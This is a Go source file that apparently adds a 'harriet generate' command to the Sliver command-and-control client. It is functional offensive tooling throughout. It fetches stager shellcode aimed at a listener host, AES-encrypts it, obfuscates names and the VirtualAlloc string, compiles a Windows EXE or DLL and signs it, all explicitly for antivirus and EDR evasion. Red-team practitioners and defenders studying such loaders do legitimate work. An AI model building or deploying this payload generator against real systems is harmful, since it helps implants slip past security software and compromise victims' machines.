package harriet

/*
	Sliver Implant Framework - Harriet Stager Integration
	Copyright (C) 2024  Bishop Fox / mgstate

	Generates Sliver shellcode and wraps it with Harriet's AES-encrypted
	C++ loader for AV/EDR evasion. Produces a signed EXE or DLL.

	Requires: Harriet repo at configurable path, mingw cross-compiler,
	Python3 for AES encryption, osslsigncode for signing.
*/

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/spf13/cobra"
)

const (
	defaultHarrietPath = "/opt/Home-Grown-Red-Team/Harriet"
)

// HarrietGenerateCmd - Generate a Harriet-wrapped Sliver payload
func HarrietGenerateCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	outputName, _ := cmd.Flags().GetString("output")
	harrietPath, _ := cmd.Flags().GetString("harriet-path")
	format, _ := cmd.Flags().GetString("format")
	method, _ := cmd.Flags().GetString("method")
	listener, _ := cmd.Flags().GetString("listener")
	arch, _ := cmd.Flags().GetString("arch")
	skipSign, _ := cmd.Flags().GetBool("no-sign")

	if harrietPath == "" {
		harrietPath = defaultHarrietPath
	}

	// Validate Harriet installation
	if _, err := os.Stat(harrietPath); os.IsNotExist(err) {
		con.PrintErrorf("Harriet not found at %s\n", harrietPath)
		con.PrintInfof("Clone it: git clone https://github.com/assume-breach/Home-Grown-Red-Team.git\n")
		con.PrintInfof("Then: harriet generate --harriet-path /path/to/Harriet\n")
		return
	}

	// Step 1: Generate Sliver shellcode
	con.PrintInfof("Generating Sliver shellcode...\n")
	shellcodePath, err := generateSliverShellcode(con, listener, arch, format)
	if err != nil {
		con.PrintErrorf("Failed to generate shellcode: %s\n", err)
		return
	}
	defer os.Remove(shellcodePath)

	con.PrintInfof("Shellcode generated: %s\n", shellcodePath)

	// Step 2: Set up Harriet build environment
	con.PrintInfof("Building Harriet payload (method: %s)...\n", method)

	outputPath, err := buildHarrietPayload(con, harrietPath, shellcodePath, outputName, method, format, skipSign)
	if err != nil {
		con.PrintErrorf("Harriet build failed: %s\n", err)
		return
	}

	// Get file size
	if info, err := os.Stat(outputPath); err == nil {
		con.PrintInfof("Harriet payload ready: %s (%d bytes)\n", outputPath, info.Size())
	} else {
		con.PrintInfof("Harriet payload ready: %s\n", outputPath)
	}
	con.PrintInfof("Method: %s | Format: %s | Signed: %v\n", method, format, !skipSign)
}

// generateSliverShellcode - Use Sliver's generate API to create raw shellcode
func generateSliverShellcode(con *console.SliverClient, listener string, arch string, format string) (string, error) {
	// Create temp file for shellcode
	tmpFile, err := os.CreateTemp("", "sliver-sc-*.bin")
	if err != nil {
		return "", fmt.Errorf("failed to create temp file: %s", err)
	}
	tmpFile.Close()

	// Map arch string to protobuf value
	archStr := "amd64"
	if arch == "x86" || arch == "386" {
		archStr = "386"
	}

	// Use generate stager or shellcode command
	// This calls the Sliver server's generate endpoint
	config := &clientpb.ImplantConfig{
		IsShellcode: true,
		Format:      clientpb.OutputFormat_SHELLCODE,
	}
	if archStr == "amd64" {
		config.GOARCH = "amd64"
	} else {
		config.GOARCH = "386"
	}

	// For now, use the msf stager generation which is more reliable for shellcode
	stagerReq := &clientpb.MsfStagerReq{
		Arch:     archStr,
		Format:   "raw",
		Host:     "",
		Port:     0,
		Protocol: clientpb.StageProtocol_TCP,
		BadChars: []string{},
	}

	// Try to parse listener as host:port
	if listener != "" {
		parts := strings.SplitN(listener, ":", 2)
		if len(parts) == 2 {
			stagerReq.Host = parts[0]
			fmt.Sscanf(parts[1], "%d", &stagerReq.Port)
		}
	}

	stager, err := con.Rpc.MsfStage(context.Background(), stagerReq)
	if err != nil {
		return "", fmt.Errorf("stager generation failed: %s", err)
	}

	if stager.GetResponse() != nil && stager.GetResponse().GetErr() != "" {
		return "", fmt.Errorf("stager error: %s", stager.GetResponse().GetErr())
	}

	shellcode := stager.GetFile().GetData()
	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode generated")
	}

	if err := os.WriteFile(tmpFile.Name(), shellcode, 0600); err != nil {
		return "", fmt.Errorf("failed to write shellcode: %s", err)
	}

	return tmpFile.Name(), nil
}

// buildHarrietPayload - Run Harriet's build process on the shellcode
func buildHarrietPayload(con *console.SliverClient, harrietPath string, shellcodePath string, output string, method string, format string, skipSign bool) (string, error) {
	// Determine which Harriet module to use
	modulePath := ""
	switch method {
	case "aes":
		modulePath = filepath.Join(harrietPath, "Harriet", "FULLAes")
	case "inject":
		modulePath = filepath.Join(harrietPath, "Harriet", "FULLInj")
	case "queueapc":
		modulePath = filepath.Join(harrietPath, "Harriet", "QueueUserAPC")
	case "nativeapi":
		modulePath = filepath.Join(harrietPath, "Harriet", "NativeAPI")
	case "directsyscall":
		modulePath = filepath.Join(harrietPath, "Harriet", "DirectSyscalls")
	default:
		modulePath = filepath.Join(harrietPath, "Harriet", "FULLAes")
	}

	if _, err := os.Stat(modulePath); os.IsNotExist(err) {
		return "", fmt.Errorf("Harriet module not found: %s", modulePath)
	}

	// Create a working directory
	workDir, err := os.MkdirTemp("", "harriet-build-*")
	if err != nil {
		return "", fmt.Errorf("failed to create work dir: %s", err)
	}
	defer os.RemoveAll(workDir)

	// Generate random variable names for obfuscation
	randNames := make(map[string]string)
	for _, name := range []string{"Random1", "Random2", "Random3", "Random4", "Random5", "Random6", "Random7", "Random8", "Random9", "RandomA"} {
		randNames[name] = randomAlpha(8)
	}
	xorKey := randomAlpha(16)

	// Copy template
	templateSrc := filepath.Join(modulePath, "template.cpp")
	templateData, err := os.ReadFile(templateSrc)
	if err != nil {
		return "", fmt.Errorf("failed to read template: %s", err)
	}
	templateStr := string(templateData)

	// Run AES encryption on shellcode
	aesScript := filepath.Join(modulePath, "Resources", "aesencrypt.py")
	if _, err := os.Stat(aesScript); os.IsNotExist(err) {
		// Fallback: find it in the parent
		aesScript = filepath.Join(harrietPath, "Harriet", "FULLAes", "Resources", "aesencrypt.py")
	}

	con.PrintInfof("Encrypting shellcode with AES...\n")
	aesOut, err := exec.Command("python3", aesScript, shellcodePath).CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("AES encryption failed: %s\nOutput: %s", err, string(aesOut))
	}

	// Parse AES output: key and encrypted payload
	aesOutput := string(aesOut)
	lines := strings.Split(aesOutput, ";")

	if len(lines) < 2 {
		// Try newline split
		lines = strings.Split(aesOutput, "\n")
	}

	keyLine := ""
	payloadLine := ""
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if strings.Contains(line, "char") && !strings.Contains(line, "unsigned") {
			keyLine = line
		}
		if strings.Contains(line, "unsigned char") {
			payloadLine = line
		}
	}

	if keyLine == "" || payloadLine == "" {
		return "", fmt.Errorf("failed to parse AES output:\n%s", aesOutput)
	}

	// Extract key value and payload value
	keyValue := extractCArrayValue(keyLine)
	payloadValue := extractCArrayValue(payloadLine)

	// Substitute into template
	templateStr = strings.ReplaceAll(templateStr, "KEYVALUE", keyValue)
	templateStr = strings.ReplaceAll(templateStr, "PAYVAL", payloadValue)
	templateStr = strings.ReplaceAll(templateStr, "XOR_KEY", xorKey)
	templateStr = strings.ReplaceAll(templateStr, "XOR_VARIABLE", randNames["RandomA"])

	for name, value := range randNames {
		templateStr = strings.ReplaceAll(templateStr, name, value)
	}

	// Handle XOR for VirtualAlloc string
	xorScript := filepath.Join(modulePath, "xor.py")
	if _, err := os.Stat(xorScript); err == nil {
		// Copy and update xor.py with our key
		xorData, _ := os.ReadFile(xorScript)
		xorStr := strings.ReplaceAll(string(xorData), "XOR_KEY", xorKey)
		tmpXor := filepath.Join(workDir, "xor.py")
		os.WriteFile(tmpXor, []byte(xorStr), 0600)

		// XOR the VirtualAlloc string
		virtFile := filepath.Join(workDir, "virt.txt")
		os.WriteFile(virtFile, []byte("VirtualAlloc"), 0600)
		xorOut, err := exec.Command("python3", tmpXor, virtFile).CombinedOutput()
		if err == nil {
			virtXored := strings.TrimSpace(string(xorOut))
			// Remove trailing "};" if present
			virtXored = strings.TrimSuffix(virtXored, "};")
			virtXored = strings.TrimSuffix(virtXored, "}")
			templateStr = strings.ReplaceAll(templateStr, "VIRALO", virtXored+"}")
		}
	}

	// Write modified template
	buildFile := filepath.Join(workDir, "payload.cpp")
	if err := os.WriteFile(buildFile, []byte(templateStr), 0600); err != nil {
		return "", fmt.Errorf("failed to write build file: %s", err)
	}

	// Compile with mingw
	compiler := "x86_64-w64-mingw32-g++"
	if format == "dll" {
		compiler = "x86_64-w64-mingw32-g++"
	}

	outputFile := output
	if outputFile == "" {
		if format == "dll" {
			outputFile = "payload.dll"
		} else {
			outputFile = "payload.exe"
		}
	}

	outputPath, _ := filepath.Abs(outputFile)

	compileArgs := []string{
		"-o", outputPath,
		buildFile,
		"-fpermissive",
		"-Wno-narrowing",
		"-mwindows",
		"-O2",
	}

	if format == "dll" {
		compileArgs = append(compileArgs, "-shared")
	}

	// Check for resource file
	resFile := filepath.Join(harrietPath, "Harriet", "Resources", "resources.res")
	if _, err := os.Stat(resFile); err == nil {
		compileArgs = append(compileArgs, resFile)
	}

	con.PrintInfof("Compiling with mingw...\n")
	compileOut, err := exec.Command(compiler, compileArgs...).CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("compilation failed: %s\nOutput: %s", err, string(compileOut))
	}

	// Sign the binary
	if !skipSign {
		certPath := filepath.Join(harrietPath, "Harriet", "Resources", "certificate.pem")
		keyPath := filepath.Join(harrietPath, "Harriet", "Resources", "private_key.pem")

		if _, err := os.Stat(certPath); err == nil {
			signedPath := outputPath + ".signed"
			con.PrintInfof("Signing binary...\n")
			signOut, err := exec.Command("osslsigncode", "sign",
				"-certs", certPath,
				"-key", keyPath,
				"-in", outputPath,
				"-out", signedPath,
			).CombinedOutput()
			if err != nil {
				con.PrintWarnf("Signing failed (non-fatal): %s\n", string(signOut))
			} else {
				os.Rename(signedPath, outputPath)
				con.PrintInfof("Binary signed successfully\n")
			}
		}
	}

	return outputPath, nil
}

// extractCArrayValue extracts the value portion from a C array declaration
func extractCArrayValue(line string) string {
	// Find the = sign and extract everything after it
	idx := strings.Index(line, "=")
	if idx == -1 {
		return line
	}
	value := strings.TrimSpace(line[idx+1:])
	value = strings.TrimSuffix(value, ";")
	return value
}

// randomAlpha generates a random alphabetic string
func randomAlpha(length int) string {
	b := make([]byte, length)
	rand.Read(b)
	s := hex.EncodeToString(b)
	// Convert hex to alpha-only
	result := make([]byte, length)
	for i := 0; i < length; i++ {
		result[i] = 'a' + (s[i] % 26)
	}
	return string(result)
}
